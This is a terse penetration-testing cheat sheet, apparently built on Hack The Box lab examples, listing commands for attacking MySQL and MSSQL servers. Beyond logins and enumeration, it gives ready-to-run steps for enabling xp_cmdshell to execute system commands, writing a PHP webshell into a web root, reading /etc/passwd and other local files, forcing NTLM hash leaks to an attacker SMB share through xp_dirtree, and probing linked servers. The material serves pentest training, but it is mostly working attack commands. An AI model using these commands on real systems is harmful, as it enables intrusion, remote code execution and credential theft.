# Mysql

% mysql, database, db, 3306
#plateform/linux  #target/remote  #protocol/mysql  #port/3306

## Login to the MySQL server - Footprinting
```
mysql -u <user> -p<password> -h <FQDN/IP>
```

## mysql - Connect to MySQL server
```
mysql -u julio -pPassword123 -h 10.129.20.13
```

## sqlcmd - Connect to MSSQL server
```
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30
```

## sqsh - Connect to MSSQL server from Linux
```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

## sqsh - Connect to MSSQL with Windows Authentication
```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

## mysql - Show databases
```
mysql> SHOW DATABASES;
```

## mysql - Select database
```
mysql> USE htbusers;
```

## mysql - Show tables
```
mysql> SHOW TABLES;
```

## mysql - Select all from users table
```
mysql> SELECT * FROM users;
```

## sqlcmd - Show databases
```
sqlcmd> SELECT name FROM master.dbo.sysdatabases
```

## sqlcmd - Select database
```
sqlcmd> USE htbusers
```

## sqlcmd - Show tables
```
sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
```

## sqlcmd - Select all from users table
```
sqlcmd> SELECT * FROM users
```

## sqlcmd - Allow advanced options
```
sqlcmd> EXECUTE sp_configure 'show advanced options', 1
```

## sqlcmd - Enable xp_cmdshell
```
sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
```

## sqlcmd - Apply configuration changes
```
sqlcmd> RECONFIGURE
```

## sqlcmd - Execute system command
```
sqlcmd> xp_cmdshell 'whoami'
```

## mysql - Create a file
```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

## mysql - Check secure file privileges
```
mysql> show variables like "secure_file_priv";
```

## sqlcmd - Read local files
```
sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

## mysql - Read local files
```
mysql> select LOAD_FILE("/etc/passwd");
```

## sqlcmd - Hash stealing with xp_dirtree
```
sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

## sqlcmd - Hash stealing with xp_subdirs
```
sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

## sqlcmd - Identify linked servers
```
sqlcmd> SELECT srvname, isremote FROM sysservers
```

## sqlcmd - Identify remote user privileges
```
sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
